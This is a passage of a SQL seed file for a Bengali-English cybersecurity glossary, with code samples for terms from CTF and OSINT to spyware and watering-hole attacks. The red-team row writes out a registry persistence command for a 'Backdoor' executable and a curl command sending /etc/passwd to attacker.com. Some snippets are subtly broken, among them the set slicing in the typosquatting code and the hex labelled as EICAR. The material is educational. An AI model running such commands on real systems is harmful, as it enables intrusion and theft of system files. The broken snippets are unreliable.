 '🚩 রহস্য উপন্যাসের মতো — সুরাহা করো, পুরস্কার পাও।',
 'CTF হলো cybersecurity competition যেখানে teams বিভিন্ন security challenge সমাধান করে "flag" (secret string) খুঁজে বের করে। Web, Crypto, Pwn, Reverse Engineering, Forensics — বিভিন্ন category।',
 'Security skill শেখা, team building, job recruitment।',
 'DEF CON CTF — বিশ্বের সবচেয়ে বড় hacking competition।',
 $code$# CTF কোথায় খেলবেন?

## Platforms
# 1. HackTheBox (https://hackthebox.com)
# 2. TryHackMe (https://tryhackme.com)  ← Beginners-এর জন্য
# 3. PicoCTF (https://picoctf.org)  ← Free, students
# 4. CTFtime (https://ctftime.org)  ← Upcoming CTFs calendar

## Tools
# Web: Burp Suite, SQLMap, Nikto
# Crypto: CyberChef, hashcat, john
# Forensics: Wireshark, Volatility, Autopsy
# Reverse: Ghidra, GDB, pwndbg
# Pwn: pwntools, ROPgadget

## Sample Python CTF Script
import hashlib, base64, itertools

# Simple hash cracking
def crack_hash(target_hash, wordlist):
    for word in open(wordlist):
        word = word.strip()
        if hashlib.md5(word.encode()).hexdigest() == target_hash:
            return word
    return None

flag = crack_hash("5f4dcc3b5aa765d61d8327deb882cf99", "/usr/share/wordlists/rockyou.txt")
print(f"Flag: {flag}")$code$,
 ARRAY['competition','learning','HackTheBox','TryHackMe','hacking'],
 'low','Security Testing',
 'https://images.unsplash.com/photo-1555949963-aa79dcee981c?w=600&q=80'),

('E','Ethical Hacking','অনুমোদিত হ্যাকিং',
 '🩺 ডাক্তার রোগ সারানোর জন্য শরীরে সূচ ঢোকান — ক্ষতি করার জন্য নয়।',
 'Ethical Hacking (White Hat Hacking) হলো সংগঠনের অনুমতি নিয়ে তাদের system-এর vulnerability খুঁজে বের করা। Black hat (criminal), White hat (ethical), Grey hat (in-between)।',
 'Security assessment, bug bounty, red team exercise।',
 'Kevin Mitnick — সাবেক notorious hacker, পরে বিশ্বের সেরা ethical hacker ও security consultant।',
 $code$# Ethical Hacking Certifications

## Entry Level
# - CEH (Certified Ethical Hacker) — EC-Council
# - CompTIA Security+
# - CompTIA PenTest+

## Advanced
# - OSCP (Offensive Security Certified Professional) — কঠিনতম
# - GPEN (GIAC Penetration Tester)
# - CRTE (Certified Red Team Expert)

## Learning Path (Free)
# 1. TryHackMe.com — beginner rooms
# 2. HackTheBox.com — intermediate/advanced
# 3. PortSwigger Web Academy — web security
# 4. PicoCTF — CTF practice

## Essential Tools
git clone https://github.com/21y4d/nmapAutomator
# Kali Linux - সব tool pre-installed
# Parrot OS - lightweight alternative

echo "Always get written permission before testing!"$code$,
 ARRAY['white-hat','CEH','OSCP','red-team','penetration-testing'],
 'low','Ethical Hacking',
 'https://images.unsplash.com/photo-1563986768609-322da13575f3?w=600&q=80'),

('G','GDPR এবং Data Privacy','ব্যক্তিগত তথ্য সুরক্ষার আইন',
 '📜 নাগরিকের অধিকারের মতো — কোম্পানি তোমার তথ্য নিলে নিয়ম মানতে হবে।',
 'GDPR (General Data Protection Regulation) হলো EU-র data privacy আইন যা বিশ্বের সবচেয়ে কঠোর। Data minimization, right to erasure, consent, breach notification — মূল নীতি।',
 'EU নাগরিকদের data handle করে এমন সব কোম্পানি।',
 'Amazon €746M, Meta €1.2B — GDPR violation-এ সর্বোচ্চ জরিমানা।',
 $code$// GDPR Compliance Checklist (Node.js)

// 1. Consent Management
async function getUserConsent(userId, purpose) {
  const consent = await db.consents.findOne({ userId, purpose });
  if (!consent?.granted) {
    throw new Error('No consent for: ' + purpose);
  }
  return consent;
}

// 2. Right to Erasure ("Right to be Forgotten")
async function deleteUserData(userId) {
  await Promise.all([
    db.users.delete({ id: userId }),
    db.orders.anonymize({ userId }),  // Anonymize, না delete (business records)
    db.logs.delete({ userId }),
    cache.del(`user:${userId}`),
    emailService.unsubscribe(userId)
  ]);
  await auditLog.record('DATA_ERASURE', userId);
}

// 3. Data Breach Notification (72 hours rule)
async function reportBreach(breachDetails) {
  // 72 ঘণ্টার মধ্যে Supervisory Authority-কে notify করুন
  await notifyDPA({
    ...breachDetails,
    reportedAt: new Date().toISOString()
  });
}$code$,
 ARRAY['privacy','compliance','EU','data-protection','consent'],
 'high','Compliance',
 'https://images.unsplash.com/photo-1563986768609-322da13575f3?w=600&q=80'),

('H','Honeypot','আক্রমণকারীকে ফাঁদে ফেলার সিস্টেম',
 '🍯 মৌচাক দেখলে ভালুক আসে — fake সিস্টেম দেখলে hacker আসে, ধরা পড়ে।',
 'Honeypot হলো ইচ্ছাকৃতভাবে vulnerable দেখানো decoy system যা attacker-কে আকৃষ্ট করে তাদের technique ও tool সম্পর্কে তথ্য সংগ্রহ করে। Production system রক্ষা করে।',
 'Threat intelligence, early warning, attacker profiling।',
 'Honeynet Project — বিশ্বজুড়ে honeypot network দিয়ে cyber threat intelligence।',
 $code$# Cowrie SSH Honeypot Deploy করুন

# Docker দিয়ে সহজে
docker run -p 2222:2222 \
  -v $(pwd)/cowrie-data:/cowrie/var \
  cowrie/cowrie

# Attacker কী করল দেখুন
tail -f cowrie-data/log/cowrie.log

# Simple HTTP Honeypot (Python)
from http.server import HTTPServer, BaseHTTPRequestHandler
import logging

logging.basicConfig(filename='honeypot.log', level=logging.INFO)

class HoneypotHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        logging.info(f"GET {self.path} from {self.client_address[0]}")
        logging.info(f"Headers: {dict(self.headers)}")
        # Fake response — attacker ভাবে সফল
        self.send_response(200)
        self.end_headers()
        self.wfile.write(b"<html><h1>Internal System</h1></html>")
    
    def log_message(self, format, *args):
        pass  # Suppress default logging

HTTPServer(('0.0.0.0', 8080), HoneypotHandler).serve_forever()$code$,
 ARRAY['deception','threat-intel','canary','early-warning','logging'],
 'medium','Defense',
 'https://images.unsplash.com/photo-1563986768609-322da13575f3?w=600&q=80'),

('I','IoT Security','ইন্টারনেট অব থিংস নিরাপত্তা',
 '🏠 স্মার্ট বাড়ির সব ডিভাইস হলো সম্ভাব্য দরজা — একটা দুর্বল হলে সব ঝুঁকিতে।',
 'IoT Security হলো internet-connected smart devices (camera, router, thermostat, medical device) সুরক্ষার চ্যালেঞ্জ। Default password, unpatched firmware — সবচেয়ে বড় সমস্যা।',
 'Smart home, industrial SCADA, healthcare devices, automotive।',
 'Mirai botnet ২০১৬ — ডিফল্ট পাসওয়ার্ড থাকা ৬০০,০০০ IoT device দিয়ে ইন্টারনেট ডাউন।',
 $code$# IoT Security Audit Script (Python)
import nmap, requests

def audit_iot_device(ip):
    nm = nmap.PortScanner()
    nm.scan(ip, '1-65535', '-sV --script=default,vuln')
    
    issues = []
    
    # Default credentials চেক
    default_creds = [('admin','admin'), ('admin','password'), 
                     ('root','root'), ('admin','')]
    for user, pwd in default_creds:
        try:
            r = requests.get(f'http://{ip}', auth=(user,pwd), timeout=3)
            if r.status_code == 200:
                issues.append(f"⚠️ Default creds work: {user}/{pwd}")
        except: pass
    
    # Telnet চেক (insecure)
    if 23 in nm[ip]['tcp']:
        issues.append("🚨 Telnet open — use SSH instead")
    
    # HTTP (not HTTPS)
    if 80 in nm[ip]['tcp'] and 443 not in nm[ip]['tcp']:
        issues.append("⚠️ HTTP only — no HTTPS")
    
    return issues$code$,
 ARRAY['smart-home','SCADA','firmware','Mirai','embedded'],
 'high','IoT Security',
 'https://images.unsplash.com/photo-1558494949-ef010cbdcc31?w=600&q=80'),

('M','Malvertising','বিজ্ঞাপনের মাধ্যমে ম্যালওয়্যার ছড়ানো',
 '📺 টিভি বিজ্ঞাপন দেখলেই বাড়িতে চোর ঢুকে যায় — malvertising-এ তাই হয়।',
 'Malvertising হলো online advertising network-এ malicious code inject করা — বৈধ সাইটের বিজ্ঞাপনেও malware থাকতে পারে, click না করলেও।',
 'Drive-by download, ransomware distribution, cryptomining।',
 '২০১৬ সালে NYTimes, BBC, AOL-এর বিজ্ঞাপনে malvertising দিয়ে ransomware ছড়ানো।',
 $code$# Malvertising Prevention

## Browser-level
# 1. Ad Blocker install করুন
#    uBlock Origin (সেরা), AdBlock Plus

# 2. Browser sandbox enable করুন
# Chrome: --no-sandbox বন্ধ রাখুন

# 3. JavaScript যেখানে প্রয়োজন শুধু সেখানে
#    NoScript extension (Firefox)

## System-level
# 4. PDF/Office macro disable করুন
# 5. Auto-play disable করুন
# 6. Patch করুন: Adobe Flash (defunct), PDF reader

## Network-level (Pi-hole)
# DNS-level ad blocking
docker run -d --name pihole \
  -p 53:53/tcp -p 53:53/udp \
  -p 80:80 \
  -e TZ="Asia/Dhaka" \
  -e WEBPASSWORD="secure_password" \
  pihole/pihole

# Pi-hole block করে malvertising domains$code$,
 ARRAY['advertising','drive-by','browser','uBlock','DNS-blocking'],
 'high','Malware',
 'https://images.unsplash.com/photo-1526374965328-7f61d4dc18c5?w=600&q=80'),

('N','Network Segmentation','নেটওয়ার্ক বিভাজন',
 '🏠 বাড়িতে আলাদা কক্ষ — রান্নাঘরে আগুন লাগলে শোবার ঘর নিরাপদ।',
 'Network Segmentation হলো network-কে isolated segment বা VLAN-এ ভাগ করা যাতে একটি অংশ compromise হলে বাকি অংশে ছড়াতে না পারে।',
 'PCI-DSS compliance, lateral movement প্রতিরোধ, IoT isolation।',
 'Target 2013 breach — HVAC vendor-এর compromised credential দিয়ে payment network-এ ঢোকা, segmentation থাকলে হত না।',
 $code$# Network Segmentation (Cisco-style)

## VLAN Configuration
# Switch
vlan 10
  name CORPORATE
vlan 20
  name GUESTS
vlan 30
  name IOT
vlan 40
  name SERVERS

## pfSense/OPNsense Firewall Rules
# GUEST → CORPORATE: BLOCK
# IOT → CORPORATE: BLOCK
# CORPORATE → SERVERS: ALLOW specific ports only

## AWS VPC Segmentation
aws ec2 create-vpc --cidr-block 10.0.0.0/16

# Public subnet (Load Balancer)
aws ec2 create-subnet --vpc-id vpc-xxx --cidr-block 10.0.1.0/24

# Private subnet (Application)
aws ec2 create-subnet --vpc-id vpc-xxx --cidr-block 10.0.2.0/24

# Isolated subnet (Database)
aws ec2 create-subnet --vpc-id vpc-xxx --cidr-block 10.0.3.0/24$code$,
 ARRAY['VLAN','network','lateral-movement','PCI-DSS','AWS-VPC'],
 'medium','Defense',
 'https://images.unsplash.com/photo-1558494949-ef010cbdcc31?w=600&q=80'),

('O','OSINT (Open Source Intelligence)','পাবলিক তথ্য থেকে গোয়েন্দাগিরি',
 '🔎 ইন্টারনেটে সার্চ করে, সোশ্যাল মিডিয়া ঘেঁটে তোমার সব তথ্য বের করা।',
 'OSINT হলো publicly available তথ্য থেকে intelligence সংগ্রহের কৌশল। LinkedIn, Twitter, DNS records, WHOIS, Shodan — অনেক source।',
 'Penetration testing reconnaissance, threat intelligence, journalism, HUMINT।',
 'Bellingcat investigators OSINT দিয়ে MH17 shoot down-এ রাশিয়ান সামরিক ইউনিট identify করেছিল।',
 $code$# OSINT Tools & Techniques

## theHarvester — Email, subdomain, employee recon
theHarvester -d target.com -b all -l 500

## Shodan — Internet-connected device search
# shodan.io — IoT, servers, cameras
shodan search 'apache 2.4.49' # Vulnerable version

## WHOIS & DNS
whois target.com
dig target.com ANY
dnsx -d target.com -a -aaaa -cname -mx -ns

## Subfinder — Subdomain enumeration
subfinder -d target.com -o subdomains.txt

## Google Dorks
# site:target.com filetype:pdf
# site:target.com inurl:admin
# "target.com" "password" filetype:txt

## Maltego — Visual link analysis
# Entity relationship mapping

## Python OSINT
import whois
w = whois.whois('google.com')
print(w.emails, w.name_servers)$code$,
 ARRAY['reconnaissance','Shodan','Google-dorks','theHarvester','Maltego'],
 'medium','Reconnaissance',
 'https://images.unsplash.com/photo-1563986768609-322da13575f3?w=600&q=80'),

('P','Port Scanning','নেটওয়ার্ক পোর্ট অনুসন্ধান',
 '🚪 একটি বড় ভবনের প্রতিটি দরজা কড়া নাড়া — কোনটা খোলা দেখা।',
 'Port Scanning হলো network host-এর কোন TCP/UDP port খোলা তা সনাক্ত করার technique। Open port মানে service চলছে, সেটাই attacker-এর entry point।',
 'Pentest reconnaissance, network audit, firewall testing।',
 'Nmap — সবচেয়ে জনপ্রিয় port scanner, Gordon Lyon (Fyodor) তৈরি।',
 $code$# Nmap Port Scanning Cheatsheet

## Basic Scans
nmap 192.168.1.1              # Top 1000 ports
nmap -p 80,443,8080 host      # Specific ports
nmap -p 1-65535 host          # All ports
nmap -p- host                 # All ports (shorthand)

## Scan Types
nmap -sS host   # SYN scan (stealth, default)
nmap -sT host   # TCP connect scan
nmap -sU host   # UDP scan (slow)
nmap -sN host   # NULL scan (firewall bypass)

## Service & OS Detection
nmap -sV host   # Service version
nmap -O host    # OS detection
nmap -A host    # All: OS, service, traceroute, scripts

## Output
nmap -oN out.txt host   # Normal
nmap -oX out.xml host   # XML (import to tools)
nmap -oG out.gnmap host # Grepable

## Common Ports
# 21 FTP, 22 SSH, 23 Telnet, 25 SMTP
# 53 DNS, 80 HTTP, 443 HTTPS, 3306 MySQL
# 3389 RDP, 5432 PostgreSQL, 6379 Redis
# 27017 MongoDB, 8080 Alt-HTTP, 9200 Elasticsearch$code$,
 ARRAY['Nmap','reconnaissance','TCP','UDP','firewall-bypass'],
 'medium','Reconnaissance',
 'https://images.unsplash.com/photo-1558494949-ef010cbdcc31?w=600&q=80'),

('R','Red Team vs Blue Team','আক্রমণ ও প্রতিরক্ষা দলের মহড়া',
 '⚔️🛡️ সেনাবাহিনীর যুদ্ধ মহড়ার মতো — একদল আক্রমণ করে, অন্যদল ঠেকায়।',
 'Red Team (attackers) ও Blue Team (defenders) organization-এর security effectiveness test করে। Purple Team দুটি একসাথে কাজ করে। Real-world attack simulation।',
 'Enterprise security maturity assessment, incident response training।',
 'US military প্রথম Red Team concept ব্যবহার করে Cold War-এ Soviet tactics simulate করতে।',
 $code$# Red Team vs Blue Team Exercise

## Red Team (Attackers) — MITRE ATT&CK Framework

### Initial Access
nmap -sV -sC --script=vuln target_network
msfconsole
> use auxiliary/scanner/smb/smb_ms17_010

### Persistence
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v Backdoor /t REG_SZ /d "C:\malware.exe"

### Exfiltration
curl -X POST https://attacker.com/collect \
  -d @/etc/passwd

## Blue Team (Defenders) — Detection

### SIEM Rules (Splunk)
index=windows EventCode=4624 Logon_Type=10
| stats count by src_ip, user
| where count > 5

### Endpoint Detection
# CrowdStrike Falcon, Microsoft Defender for Endpoint

### Threat Hunting
python3 << EOF
import pandas as pd
logs = pd.read_csv('auth.log')
suspicious = logs[logs['failed_attempts'] > 10]
print(suspicious)
EOF$code$,
 ARRAY['MITRE-ATTCK','purple-team','simulation','SOC','threat-hunting'],
 'medium','Security Testing',
 'https://images.unsplash.com/photo-1555949963-aa79dcee981c?w=600&q=80'),

('S','Spyware','গোপনে ব্যবহারকারীর তথ্য সংগ্রহকারী সফটওয়্যার',
 '🕵️ অজান্তে পিছু নেওয়ার মতো — তুমি জানো না, সে সব দেখছে।',
 'Spyware হলো malware যা user-এর অজান্তে ব্যক্তিগত তথ্য সংগ্রহ করে — browser history, keystrokes, screenshots, location, microphone/camera access।',
 'Stalkerware (domestic abuse), corporate espionage, government surveillance।',
 'Pegasus spyware (NSO Group) — iPhone zero-click exploit দিয়ে journalists ও activists monitor।',
 $code$# Spyware Detection (Android — ADB)

## Suspicious permissions চেক
adb shell dumpsys package | grep -A 20 "requested permissions"

## Camera/Mic access করা apps
adb shell appops get <package> CAMERA
adb shell appops get <package> RECORD_AUDIO

## Background data usage
adb shell cat /proc/net/xt_qtaguid/stats

## Python — Process monitoring (Desktop)
import psutil

def check_privacy_risks():
    risky = []
    for proc in psutil.process_iter(['name','pid']):
        try:
            # Microphone/Camera access চেক (Windows)
            if any('camera' in str(f.path).lower() 
                   or 'microphone' in str(f.path).lower()
                   for f in proc.open_files()):
                risky.append(proc.info)
        except: pass
    return risky

print("Privacy risks:", check_privacy_risks())

# Prevention: Tape camera, check app permissions, use privacy screen$code$,
 ARRAY['surveillance','Pegasus','stalkerware','privacy','camera'],
 'critical','Malware',
 'https://images.unsplash.com/photo-1526374965328-7f61d4dc18c5?w=600&q=80'),

('T','Typosquatting','ভুল টাইপিংয়ের সুযোগ নেওয়া',
 '🏪 "MacDonlds" রেস্টুরেন্ট খুলে McDonalds-এর গ্রাহক ধরা।',
 'Typosquatting হলো popular domain বা package-এর typo version রেজিস্টার করা। goggle.com, faceboook.com, npm-এ coloRS vs colors।',
 'Phishing, malware distribution, credential harvesting, npm/pip attack।',
 'npm incident: event-stream package-এ malicious dependency inject।',
 $code$# Typosquatting Detection

import itertools, requests
from difflib import SequenceMatcher

def generate_typos(domain):
    """Common typos generate করুন"""
    name, tld = domain.rsplit('.', 1)
    typos = set()
    
    # Double letters
    for i in range(len(name)):
        typos.add(name[:i] + name[i]*2 + name[i+1:] + '.' + tld)
    
    # Missing letter
    for i in range(len(name)):
        typos.add(name[:i] + name[i+1:] + '.' + tld)
    
    # Common substitutions: o→0, l→1, a→@
    subs = {'o':'0', 'l':'1', 'i':'1', 'a':'@'}
    for char, sub in subs.items():
        typos.add(name.replace(char, sub) + '.' + tld)
    
    return typos

for typo in generate_typos('google.com')[:5]:
    print(f"Potential typosquat: {typo}")$code$,
 ARRAY['phishing','domain','npm','homograph','brand-protection'],
 'high','Social Engineering',
 'https://images.unsplash.com/photo-1563986768609-322da13575f3?w=600&q=80'),

('U','USB Drop Attack','ক্ষতিকর USB ফেলে রাখার আক্রমণ',
 '💾 রাস্তায় পড়ে থাকা মানিব্যাগ কুড়ানো — কৌতূহলে বিপদে পড়া।',
 'USB Drop Attack হলো একটি social engineering কৌশল যেখানে attacker ইচ্ছাকৃতভাবে malicious USB drive ফেলে রাখে — কেউ কুড়িয়ে PC-তে দিলেই malware চলে।',
 'Corporate espionage, air-gapped network compromise।',
 'Pentagon 2008 — একটি infected USB drive Russian hackers-কে classified network access দিয়েছিল।',
 $code$# USB Drop Attack Prevention

## Group Policy (Windows)
# Block removable storage
gpmc.msc → Computer Configuration
  → Administrative Templates
  → System → Removable Storage Access
  → All Removable Storage classes: Deny all access → Enabled

## Linux — USBGuard
sudo apt install usbguard

# Whitelist নির্দিষ্ট USB device
usbguard list-devices
usbguard allow-device <ID>

# Block সব unknown USB
usbguard generate-policy > /etc/usbguard/rules.conf
systemctl enable --now usbguard

## Technical Defense
# - Endpoint DLP software
# - USB port physically block করুন
# - USB Condom (charge only, no data)
# - CISOfy USB Rubber Ducky detection

# Education:
# 2016 study: 98% লোক unknown USB plug করে
print("Never plug in unknown USB drives!")$code$,
 ARRAY['physical-security','social-engineering','BadUSB','air-gap','endpoint'],
 'high','Social Engineering',
 'https://images.unsplash.com/photo-1563986768609-322da13575f3?w=600&q=80'),

('V','Virus','স্ব-প্রতিলিপিকারী ক্ষতিকর প্রোগ্রাম',
 '🦠 জৈবিক ভাইরাসের মতো — host file ছাড়া ছড়াতে পারে না, কিন্তু host-এর সাহায্যে ছড়ায়।',
 'Computer Virus হলো self-replicating malicious code যা legitimate files-এ attach করে ছড়ায়। Worm থেকে আলাদা — virus-এর host file দরকার। Boot sector, file infector, macro virus — ধরন।',
 'File corruption, data theft, system damage।',
 'ILOVEYOU virus (2000) — email attachment থেকে $10B+ ক্ষতি, ৫০M+ computers infected।',
 $code$# Virus Signature Detection (Python)
import hashlib, os

# Virus signature database
SIGNATURES = {
    # EICAR test string (harmless test)
    bytes.fromhex('58354f2150254041505b345c5058353428585e295b2858344f582355533858584f285842503546572558344f5825585025434343434343433d30433b373742616236303e3d32367e3b39373131433433313035313a333736353b3537353a39333534352e303939353b3534382e333636363b33323533363339323b333437353b342e302e303b313133'): 'EICAR-Test-File',
}

def scan(filepath):
    with open(filepath, 'rb') as f:
        content = f.read()
    
    for sig, name in SIGNATURES.items():
        if sig in content:
            print(f"🚨 VIRUS FOUND: {name} in {filepath}")
            return True
    return False

def scan_dir(directory):
    for root, _, files in os.walk(directory):
        for fname in files:
            scan(os.path.join(root, fname))$code$,
 ARRAY['self-replicating','file-infector','boot-sector','EICAR','malware'],
 'critical','Malware',
 'https://images.unsplash.com/photo-1526374965328-7f61d4dc18c5?w=600&q=80'),

('W','Watering Hole Attack','লক্ষ্যবস্তুর পরিচিত সাইটে ফাঁদ',
 '🦁 সিংহ জলের কূপের কাছে অপেক্ষা করে — শিকার নিজেই আসে।',
 'Watering Hole Attack হলো attacker target group-এর নিয়মিত ভিজিট করা ওয়েবসাইট compromise করে — targeted phishing এর চেয়ে বেশি কার্যকর।',
 'Targeted attacks against specific industry, government, or organization।',
 '২০১৩ সালে Apple, Facebook, Twitter কর্মীরা infected iOS developer site থেকে malware পেয়েছিল।',
 $code$# Watering Hole Defense

## Browser Security
# 1. Browser isolation ব্যবহার করুন
#    Remote Browser Isolation (RBI) — Menlo, Zscaler

# 2. Browser extension minimize করুন
# 3. JavaScript selective enable — NoScript

## Network-level Defense
# DNS Filtering
aws route53resolver create-firewall-rule-group \
  --name "malicious-domains-block"

# Proxy / Secure Web Gateway
# Zscaler, Palo Alto Prisma, Forcepoint

## Endpoint Defense
# 1. Patch করুন: Browser, PDF, Office
# 2. Application whitelisting
# 3. EDR solution (CrowdStrike, SentinelOne)

## Detection (Suricata rule)
alert http $HOME_NET any -> $EXTERNAL_NET any (
  msg:"Watering Hole Download";
  flow:established,to_server;
  content:".exe"; http_uri;
  content:"drive-by"; http_header;
  sid:3000001;
)$code$,
 ARRAY['targeted','drive-by','browser','APT','industry'],
 'critical','Attack Vector',
 'https://images.unsplash.com/photo-1526374965328-7f61d4dc18c5?w=600&q=80')

ON CONFLICT (term) DO NOTHING;

-- ═══════════════════════════════════════════════════════
-- VERIFY: Total count
-- ═══════════════════════════════════════════════════════
SELECT 
  COUNT(*) as total_terms,
  COUNT(DISTINCT letter) as letters_covered,
  COUNT(CASE WHEN risk = 'critical' THEN 1 END) as critical_count,
  COUNT(CASE WHEN risk = 'high' THEN 1 END) as high_count,
  COUNT(CASE WHEN risk = 'medium' THEN 1 END) as medium_count,
  COUNT(CASE WHEN risk = 'low' THEN 1 END) as low_count
FROM public.cyber_terms;

-- Letter distribution দেখুন
SELECT letter, COUNT(*) as count, 
  string_agg(term, ', 'ORDER BY term) as terms
FROM public.cyber_terms 
GROUP BY letter 
ORDER BY letter;
